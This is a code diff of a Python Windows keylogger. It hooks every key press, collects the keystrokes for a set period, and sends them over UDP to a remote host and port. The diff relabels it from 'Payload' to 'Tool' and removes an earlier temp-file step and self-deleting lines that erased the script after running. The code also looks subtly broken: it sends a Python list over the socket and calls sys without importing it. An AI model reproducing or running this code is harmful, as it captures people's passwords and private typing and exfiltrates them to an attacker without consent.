@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 
-""" Windows Key Logger Payload
+""" Windows Key Logger Tool
 
 Usage:
 
@@ -8,7 +8,6 @@ Usage:
 
 """
 import argparse
-import logging
 import os
 import pyHook
 import pythoncom
@@ -16,14 +15,7 @@ import socket
 import time
 
 
-# Name of file to log key presses to.
-LOG_FILE_NAME = 'tmp_windows_key_log.log'
-
-# Format of log messages.
-LOG_FORMAT = '%(message)s'
-
-# File modes.
-READ_MODE = 'r'
+LOG = []
 
 
 def get_command_line_parser():
@@ -43,13 +35,13 @@ def get_command_line_parser():
   parser.add_argument(
     'host_name',
     type=str,
-    help='the host name of the receiving machine',
+    help='the host name of the machine receiving the logged keystrokes',
   )
 
   parser.add_argument(
     'port_number',
     type=int,
-    help='the port number of the receiving machine',
+    help='the port number of the machine receiving the logged keystrokes',
   )
 
   return parser
@@ -58,29 +50,22 @@ def get_command_line_parser():
 def keyboard_hook(event):
   """ Keyboard key down hook function.
 
-  Logs all key presses to `LOG_FILE_NAME`.
-
   Args:
     event (object): A keyboard key down event object.
 
   Returns:
     bool: True.
   """
-  logging.log(logging.INFO, chr(event.Ascii))
+  global LOG
+  LOG.append(chr(event.Ascii))
 
   return True
 
 
 def main():
-  """ Runs the Windows key logger payload. """
+  """ Runs the Windows key logger tool. """
   parser = get_command_line_parser()
   args = parser.parse_args()
-
-  logging.basicConfig(
-    filename=LOG_FILE_NAME,
-    level=logging.INFO,
-    format=LOG_FORMAT,
-  )
 
   hook_manager = pyHook.HookManager()
   hook_manager.KeyDown = keyboard_hook
@@ -91,16 +76,10 @@ def main():
   while time.time() - start < args.duration:
     pythoncom.PumpWaitingMessages()
 
-  with open(LOG_FILE_NAME, READ_MODE) as f:
-    data = f.read()
-
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   s.connect((args.host_name, args.port_number))
-  s.send(data)
+  s.send(LOG)
   s.close()
-
-  os.remove(LOG_FILE_NAME)
-  os.remove(sys.argv[0])
 
 
 if __name__ == '__main__':
